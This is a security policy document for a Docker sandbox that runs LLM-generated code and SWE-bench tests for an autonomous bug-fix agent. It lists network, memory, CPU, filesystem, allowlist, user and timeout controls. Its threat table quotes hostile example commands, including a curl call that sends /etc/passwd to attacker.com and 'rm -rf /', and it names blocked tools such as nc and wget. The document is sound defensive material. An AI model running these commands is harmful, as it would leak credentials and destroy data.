# Sandbox Security Policy

## Purpose
This document describes the security controls applied to the Docker-based code execution
sandbox used by the Autonomous Code Review & Bug-Fix Agent.

## Threat Model
The sandbox runs **untrusted LLM-generated code** and **arbitrary pytest test suites**
from public GitHub repositories. The risk categories are:

| Threat | Example | Control |
|--------|---------|---------|
| Data exfiltration | `curl https://attacker.com/$(cat /etc/passwd)` | `--network=none` |
| Resource exhaustion | Infinite loop / fork bomb | `--memory=2g`, `--cpus=2.0`, 60s timeout |
| Host filesystem access | `open('/etc/passwd')` | `--read-only`, volume-limited |
| Privilege escalation | `sudo rm -rf /` | Non-root user (uid=1000) |
| Malicious commands | `rm -rf /workspace` | Command whitelist |
| Persistent state | Writing outside /workspace | `--read-only` + limited tmpfs |

## Security Controls (7 Layers)

### 1. Network Isolation — `--network=none`
The container has **zero network access**. No DNS, no HTTP, no TCP sockets.
This is the most important control — it prevents data exfiltration and
supply-chain attacks from untrusted test dependencies.

### 2. Memory cgroup — `--memory=2g`
Container is killed by the kernel OOM killer if memory exceeds 2 GB.
Prevents fork bombs and memory exhaustion from affecting the host.

### 3. CPU cgroup — `--cpus=2.0`
Limits container to 2 CPU cores. Prevents CPU saturation that would
degrade other running containers / the host system.

### 4. Read-Only Filesystem — `--read-only --tmpfs=/tmp:size=256m`
The container's filesystem is mounted read-only. Only two writable locations:
- `/workspace` — the cloned repo (bind-mounted, scoped to this run)
- `/tmp` — tmpfs, 256 MB, wiped at container exit

### 5. Command Whitelist — `ALLOWED_COMMANDS`
Before any command reaches Docker, the executor checks the base command name
against an allowlist: `{git, pytest, python, python3, pip, pip3, cat, ls, echo,
find, grep, head, tail, mkdir, cp, mv, touch, chmod}`.

Commands like `rm`, `curl`, `wget`, `bash`, `sh`, `nc` are blocked at this layer.

### 6. Non-Root User — `uid=1000`
All processes run as `agent:agent (1000:1000)`. If an exploit escapes the
command whitelist, it cannot modify system files or escalate privileges.

### 7. Timeout — 60 seconds SIGKILL
The executor sets a 60-second hard timeout. The container is killed via
`docker stop --time=0` (SIGKILL) to prevent hung processes from consuming
resources indefinitely.

## Isolation Per Run
Each SWE-bench instance gets a **fresh temporary directory** as its workspace.
The container is created with `--rm` so it is automatically deleted after each run.
No state persists between runs.

## Audit Log
Every command executed in the sandbox is logged with:
- instance_id
- command (truncated to first 3 tokens for brevity)
- returncode
- elapsed_seconds
- timed_out flag

Logs are written to `structlog` (JSON format in production) and ingested by
the Prometheus/Grafana observability stack in Phase 8.

## Known Limitations
- **Conda environments**: Some SWE-bench repos require specific conda environments
  with C extensions. The current sandbox uses pip-only install. This may cause
  test failures for repos with complex native dependencies.
- **Docker-in-Docker**: The sandbox does not support running Docker inside Docker.
  Repos that spawn subprocesses to call Docker will fail at the network level.
- **Flaky tests**: ~8% of SWE-bench issues have non-deterministic tests. These may
  burn retries even when the patch is correct. Flagged as `flaky_test` category.
